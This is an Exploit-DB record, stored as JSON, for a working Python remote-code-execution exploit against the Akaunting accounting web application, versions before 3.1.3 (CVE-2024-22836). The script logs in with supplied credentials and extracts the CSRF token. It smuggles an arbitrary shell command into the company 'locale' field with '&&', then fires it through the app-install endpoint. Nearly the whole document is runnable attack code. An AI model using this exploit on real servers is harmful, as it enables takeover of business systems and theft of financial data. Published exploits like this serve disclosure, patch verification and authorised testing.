{"source": "https://www.exploit-db.com/exploits/51870", "vulnName": "Akaunting < 3.1.3 - RCE", "vulnEDBID": "51870", "vulnCVE": "2024-22836", "author": "U32I", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-03-10", "vulnContent": "# Exploit Title: Akaunting < 3.1.3 - RCE\n# Date: 08/02/2024\n# Exploit Author: u32i@proton.me\n# Vendor Homepage: https://akaunting.com\n# Software Link: https://github.com/akaunting/akaunting\n# Version: <= 3.1.3\n# Tested on: Ubuntu (22.04)\n# CVE : CVE-2024-22836\n\n#!/usr/bin/python3\n\nimport sys\nimport re\nimport requests\nimport argparse\n\ndef get_company():\n # print(\"[INF] Retrieving company id...\")\n res = requests.get(target, headers=headers, cookies=cookies, allow_redirects=False)\n if res.status_code != 302:\n  print(\"[ERR] No company id was found!\")\n  sys.exit(3)\n cid = res.headers['Location'].split('/')[-1]\n if cid == \"login\":\n  print(\"[ERR] Invalid session cookie!\")\n  sys.exit(7)\n return cid\n\ndef get_tokens(url):\n res = requests.get(url, headers=headers, cookies=cookies, allow_redirects=False)\n search_res = re.search(r\"\\\"csrfToken\\\"\\:\\\".*\\\"\", res.text)\n\n if not search_res:\n  print(\"[ERR] Couldn't get csrf token\")\n  sys.exit(1)\n\n data = {}\n data['csrf_token'] = search_res.group().split(':')[-1:][0].replace('\"', '')\n data['session'] = res.cookies.get('akaunting_session')\n return data\n\ndef inject_command(cmd):\n url = f\"{target}/{company_id}/wizard/companies\"\n tokens = get_tokens(url)\n headers.update({\"X-Csrf-Token\": tokens['csrf_token']})\n data = {\"_token\": tokens['csrf_token'], \"_method\": \"POST\", \"_prefix\": \"company\", \"locale\": f\"en_US && {cmd}\"}\n res = requests.post(url, headers=headers, cookies=cookies, json=data, allow_redirects=False)\n if res.status_code == 200:\n  res_data = res.json()\n  if res_data['error']:\n   print(\"[ERR] Command injection failed!\")\n   sys.exit(4)\n  print(\"[INF] Command injected!\")\n\n\ndef trigger_rce(app, version = \"1.0.0\"):\n print(\"[INF] Executing the command...\")\n url = f\"{target}/{company_id}/apps/install\"\n data = {\"alias\": app, \"version\": version, \"path\": f\"apps/{app}/download\"}\n headers.update({\"Content-Type\":\"application/json\"})\n res = requests.post(url, headers=headers, cookies=cookies, json=data, allow_redirects=False)\n if res.status_code == 200:\n  res_data = res.json()\n  if res_data['error']:\n   search_res = re.search(r\">Exit Code\\:.*<\", res_data['message'])\n   if search_res:\n    print(\"[ERR] Failed to execute the command\")\n    sys.exit(6)\n   print(\"[ERR] Failed to install the app! no command was executed!\")\n   sys.exit(5)\n  print(\"[INF] Executed successfully!\")\n\ndef login(email, password):\n url = f\"{target}/auth/login\"\n tokens = get_tokens(url)\n\n cookies.update({\n  'akaunting_session': tokens['session']\n })\n\n data = {\n  \"_token\": tokens['csrf_token'],\n  \"_method\": \"POST\",\n  \"email\": email,\n  \"password\": password\n }\n \n req = requests.post(url, headers=headers, cookies=cookies, data=data)\n res = req.json()\n if res['error']:\n  print(\"[ERR] Failed to log in!\")\n  sys.exit(8)\n\n print(\"[INF] Logged in\")\n cookies.update({'akaunting_session': req.cookies.get('akaunting_session')})\n  \ndef main():\n inject_command(args.command)\n trigger_rce(args.alias, args.version)\n\nif __name__=='__main__':\n parser = argparse.ArgumentParser()\n parser.add_argument(\"-u\", \"--url\", help=\"target url\")\n parser.add_argument(\"--email\", help=\"user login email.\")\n parser.add_argument(\"--password\", help=\"user login password.\")\n parser.add_argument(\"-i\", \"--id\", type=int, help=\"company id (optional).\")\n parser.add_argument(\"-c\", \"--command\", help=\"command to execute.\")\n parser.add_argument(\"-a\", \"--alias\", help=\"app alias, default: paypal-standard\", default=\"paypal-standard\")\n parser.add_argument(\"-av\", \"--version\", help=\"app version, default: 3.0.2\", default=\"3.0.2\")\n\n args = parser.parse_args()\n \n headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36\"}\n cookies = {}\n target = args.url\n\n try:\n  login(args.email, args.password)\n  company_id = get_company() if not args.id else args.id\n  main()\n except:\n  sys.exit(0)\n            "}